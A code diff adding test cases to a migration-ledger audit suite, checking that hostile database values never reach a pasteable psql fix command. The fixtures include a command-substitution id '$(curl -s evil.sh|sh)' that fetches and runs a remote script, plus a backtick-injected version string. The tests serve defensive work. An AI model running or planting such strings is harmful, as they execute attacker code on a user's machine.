@@ -358,4 +358,56 @@ describe('auditLedger refuses a migration this build does not ship', () => {
   test('a ledger this build ships in full still passes', () => {
     expect(() => auditLedger([ledgerRow()], [addPosts], 'dev')).not.toThrow();
   });
+
+  // Both values are the DATABASE's: whoever can write a ledger row picks the text that lands in a
+  // line this file's own comment says is copied and run verbatim, and `psql "$DATABASE_URL" -c
+  // "…"` puts it inside SHELL DOUBLE QUOTES, where `$(…)` and a backtick substitute before psql
+  // is reached at all. The screen is `shellInertIdentifier`, the one `drift-findings.ts` uses.
+  test('a migration id that would run a command in the reader shell degrades to prose', () => {
+    const hostile = ledgerRow({ id: '$(curl -s evil.sh|sh)', app_version: 'dev' });
+    let thrown: unknown;
+    try {
+      auditLedger([hostile], [addPosts], 'dev');
+    } catch (error) {
+      thrown = error;
+    }
+
+    const error = thrown as { code: string; cause: string; fix: string };
+    expect(error.code).toBe('X_MIGRATION_CONFLICT');
+    // The id is still reported — it is prose nobody pastes.
+    expect(error.cause).toContain('$(curl');
+    expect(error.fix).not.toContain('$(');
+    expect(error.fix).not.toContain('psql');
+  });
+
+  test('an app version carrying a backtick degrades the same way', () => {
+    const hostile = ledgerRow({ id: '20260202000000_deleted', app_version: '`id`' });
+    let thrown: unknown;
+    try {
+      auditLedger([hostile], [addPosts], 'dev');
+    } catch (error) {
+      thrown = error;
+    }
+
+    const error = thrown as { code: string; cause: string; fix: string };
+    expect(error.cause).toContain('`id`');
+    expect(error.fix).not.toContain('`');
+    expect(error.fix).not.toContain('psql');
+  });
+
+  test('an id holding a quote keeps its command, with the SQL literal escaped', () => {
+    // A `'` is legal in an identifier and inert in shell double quotes, so the shell screen lets
+    // it through deliberately — but it would close the SQL literal it is spliced into, so the
+    // command is built through `literal()`, this package's one string-literal escape.
+    const quoted = ledgerRow({ id: "20260202_a'b", app_version: 'dev' });
+    let thrown: unknown;
+    try {
+      auditLedger([quoted], [addPosts], 'dev');
+    } catch (error) {
+      thrown = error;
+    }
+
+    const error = thrown as { fix: string };
+    expect(error.fix).toContain("id = '20260202_a''b'");
+  });
 });
